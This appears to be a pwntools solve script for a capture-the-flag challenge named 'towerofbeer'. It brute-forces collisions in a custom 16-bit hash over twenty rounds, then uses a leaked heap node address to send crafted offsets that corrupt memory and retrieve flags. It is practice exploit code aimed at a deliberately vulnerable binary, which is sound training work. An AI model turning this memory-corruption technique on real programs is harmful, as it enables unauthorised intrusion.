#!/usr/bin/env python
from pwn import *

MOD = 1 << 16

def f(a):
    return (((0x43726f73 * a) % 0x100000000) + 0x73435446) % 0x100000000

def h(p):
    res = 0
    for c in p:
        res = (res + ord(c)) % 0x100000000
        res = f(res)
    return res % MOD

def rochefort6(target, ans=""):
    next_iter = [ans]
    while True:
        next_next_iter = []
        for a in next_iter:
            for i in range(32, 126):
                curr_ans = a + chr(i)
                if h(curr_ans + '\n') == target:
                    return curr_ans
                else:
                    next_next_iter.append(curr_ans)
            next_iter = next_next_iter
            next_next_iter = []

def rochefort8(node_addr):
    NODE_SIZE = 8 * 5
    ans = "-2 -4 -2 3 3"
    ans += " " + str(node_addr - 24)
    ans += " " + str(node_addr - NODE_SIZE - NODE_SIZE)
    ans += " " + str(node_addr - 16)
    ans += " " + str(node_addr + 99999)
    ans += " " + str(node_addr + NODE_SIZE)
    return ans

def main():
    p = process("./towerofbeer")
    #p = remote("ctf.pwn.sg", 1500)
    target =  int(p.recv().split('\n')[1])

    for i in range(20):
       # bruteforce
        r6 = rochefort6(target)
        p.sendline(r6)
        if i != 19:
            target =  int(p.recv().split('\n')[2])
    p.recv() #your poutput
    log.info("Rochefort 6 Flag: %s" % p.recv().strip())
    node0_addr = int(p.recv().split('\n')[1], 16)
    log.info(hex(node0_addr))
    
    r8 = rochefort8(node0_addr)
    p.sendline(r8)

    log.info("Rochefort 8 Flag: %s" % p.recv().strip())

if __name__ == "__main__":
    main()
